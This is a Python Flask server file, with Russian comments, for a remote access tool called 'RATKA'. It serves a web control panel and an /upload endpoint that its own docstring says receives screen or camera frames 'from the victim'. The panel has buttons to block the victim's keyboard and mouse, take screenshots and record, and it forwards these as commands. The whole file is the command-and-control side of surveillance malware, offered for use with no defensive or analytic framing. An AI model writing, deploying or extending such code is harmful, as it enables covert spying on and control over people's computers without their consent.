# app.py - ДЛЯ RENDER (БЕЗ OPENCV, ТОЛЬКО PIL)
from flask import Flask, request, jsonify, send_file
import base64
import io
import os
from PIL import Image

app = Flask(__name__)

# Хранилище
current_frame = None

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>RATKA CONTROL</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0a0a1a;
                font-family: 'Segoe UI', sans-serif;
                color: #00ff88;
                min-height: 100vh;
                padding: 15px;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .container { max-width: 700px; width: 100%; }
            .header {
                text-align: center;
                padding: 20px;
                border: 2px solid #00ff88;
                border-radius: 16px;
                margin-bottom: 15px;
                background: rgba(0,255,136,0.05);
            }
            .header h1 { font-size: 28px; }
            .video-box {
                background: #000;
                border: 3px solid #00ff88;
                border-radius: 16px;
                overflow: hidden;
                aspect-ratio: 16/9;
                margin-bottom: 15px;
                position: relative;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .video-box img {
                width: 100%;
                height: 100%;
                object-fit: cover;
            }
            .video-box .placeholder {
                position: absolute;
                color: #00ff88;
                opacity: 0.5;
                text-align: center;
            }
            .video-box .placeholder .icon { font-size: 48px; display: block; }
            .status {
                display: grid;
                grid-template-columns: 1fr 1fr 1fr;
                gap: 8px;
                padding: 12px;
                border: 1px solid #00ff88;
                border-radius: 12px;
                margin-bottom: 15px;
                background: rgba(0,255,136,0.05);
            }
            .status-item { text-align: center; }
            .status-item .label { opacity: 0.6; font-size: 10px; text-transform: uppercase; }
            .status-item .value { font-size: 16px; font-weight: bold; }
            .online { color: #00ff88; }
            .offline { color: #ff4444; }
            .controls { display: grid; gap: 10px; }
            .btn-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
            .btn {
                background: #1a3a3a;
                color: #00ff88;
                border: 2px solid #00ff88;
                border-radius: 12px;
                padding: 14px;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.15s;
                text-align: center;
                user-select: none;
                touch-action: manipulation;
                font-size: 14px;
            }
            .btn:active { transform: scale(0.95); }
            .btn.active { background: #00ff88; color: #0a0a1a; }
            .btn.danger { border-color: #ff0044; color: #ff0044; }
            .btn.danger:active { background: #ff0044; color: #0a0a1a; }
            .btn.full { grid-column: 1 / -1; }
            .toast {
                position: fixed;
                bottom: 30px;
                left: 50%;
                transform: translateX(-50%);
                background: #1a3a3a;
                color: #00ff88;
                padding: 10px 24px;
                border-radius: 12px;
                border: 1px solid #00ff88;
                font-size: 13px;
                font-weight: 600;
                opacity: 0;
                transition: opacity 0.3s;
                pointer-events: none;
                z-index: 999;
            }
            .toast.show { opacity: 1; }
            .footer { text-align: center; margin-top: 15px; font-size: 11px; opacity: 0.3; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎯 RATKA</h1>
                <div style="font-size:13px;opacity:0.7;">Управление через интернет</div>
            </div>
            
            <div class="video-box">
                <img id="video" src="/video" alt="Камера">
                <div class="placeholder" id="placeholder">
                    <span class="icon">📹</span>
                    Ожидание подключения...
                </div>
            </div>
            
            <div class="status">
                <div class="status-item">
                    <div class="label">Статус</div>
                    <div class="value online" id="status">⏳ Ожидание</div>
                </div>
                <div class="status-item">
                    <div class="label">Клиенты</div>
                    <div class="value" id="clients">0</div>
                </div>
                <div class="status-item">
                    <div class="label">Сервер</div>
                    <div class="value" id="server">Online</div>
                </div>
            </div>
            
            <div class="controls">
                <div class="btn-row">
                    <button class="btn" id="kbBtn" onclick="toggleKb()">⌨️ Клава</button>
                    <button class="btn" id="msBtn" onclick="toggleMs()">🖱️ Мышь</button>
                </div>
                <div class="btn-row">
                    <button class="btn" onclick="screenshot()">📸 Скрин</button>
                    <button class="btn" id="recBtn" onclick="toggleRecord()">🎥 Запись</button>
                </div>
                <button class="btn danger full" onclick="disconnect()">🔌 Отключить</button>
            </div>
            
            <div class="footer">RATKA v3.0 • Без портов</div>
        </div>
        
        <div class="toast" id="toast"></div>
        
        <script>
            const video = document.getElementById('video');
            const placeholder = document.getElementById('placeholder');
            const statusEl = document.getElementById('status');
            const clientsEl = document.getElementById('clients');
            
            function updateVideo() {
                video.src = '/video?_=' + Date.now();
            }
            setInterval(updateVideo, 100);
            
            video.onload = function() {
                placeholder.style.display = 'none';
                statusEl.textContent = '🟢 Онлайн';
                statusEl.className = 'value online';
            };
            
            function showToast(text) {
                const t = document.getElementById('toast');
                t.textContent = text;
                t.classList.add('show');
                clearTimeout(t._timer);
                t._timer = setTimeout(() => t.classList.remove('show'), 2000);
            }
            
            async function sendCommand(cmd, val) {
                try {
                    await fetch('/command?cmd=' + encodeURIComponent(cmd) + (val !== undefined ? '&val=' + encodeURIComponent(val) : ''));
                } catch(e) {}
            }
            
            function toggleKb() {
                const btn = document.getElementById('kbBtn');
                const active = btn.classList.toggle('active');
                btn.innerHTML = active ? '⌨️ Блок!' : '⌨️ Клава';
                sendCommand('block_kb', active);
                showToast(active ? '⌨️ Клавиатура ЗАБЛОКИРОВАНА' : '⌨️ Клавиатура разблокирована');
            }
            
            function toggleMs() {
                const btn = document.getElementById('msBtn');
                const active = btn.classList.toggle('active');
                btn.innerHTML = active ? '🖱️ Блок!' : '🖱️ Мышь';
                sendCommand('block_mouse', active);
                showToast(active ? '🖱️ Мышь ЗАБЛОКИРОВАНА' : '🖱️ Мышь разблокирована');
            }
            
            function screenshot() {
                sendCommand('screenshot');
                showToast('📸 Скриншот');
            }
            
            function toggleRecord() {
                const btn = document.getElementById('recBtn');
                const active = btn.classList.toggle('active');
                btn.innerHTML = active ? '⏹️ Стоп' : '🎥 Запись';
                sendCommand('record', active);
                showToast(active ? '🎥 Запись начата' : '⏹️ Запись остановлена');
            }
            
            function disconnect() {
                if (confirm('Отключить всех клиентов?')) {
                    sendCommand('disconnect');
                    showToast('🔌 Отключено');
                }
            }
            
            async function updateStatus() {
                try {
                    const resp = await fetch('/status');
                    const data = await resp.json();
                    clientsEl.textContent = data.clients || 0;
                } catch(e) {}
            }
            setInterval(updateStatus, 3000);
            updateStatus();
        </script>
    </body>
    </html>
    '''

@app.route('/upload', methods=['POST'])
def upload():
    """Принимает видео от жертвы"""
    global current_frame
    
    try:
        data = request.get_json()
        if 'frame' in data:
            frame_data = base64.b64decode(data['frame'])
            img = Image.open(io.BytesIO(frame_data))
            current_frame = img
            return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
    return jsonify({'status': 'error'}), 400

@app.route('/video')
def video():
    """Отдаёт видео админу"""
    global current_frame
    
    if current_frame is not None:
        buf = io.BytesIO()
        current_frame.save(buf, format='JPEG', quality=70)
        buf.seek(0)
        return send_file(buf, mimetype='image/jpeg')
    else:
        img = Image.new('RGB', (640, 480), color='black')
        buf = io.BytesIO()
        img.save(buf, format='JPEG')
        buf.seek(0)
        return send_file(buf, mimetype='image/jpeg')

@app.route('/command')
def command():
    """Команды от админа"""
    cmd = request.args.get('cmd', '')
    val = request.args.get('val', '')
    print(f"[CMD] {cmd} = {val}")
    return jsonify({'status': 'ok'})

@app.route('/status')
def status():
    """Статус"""
    global current_frame
    return jsonify({
        'clients': 1 if current_frame is not None else 0,
        'status': 'online' if current_frame is not None else 'waiting'
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
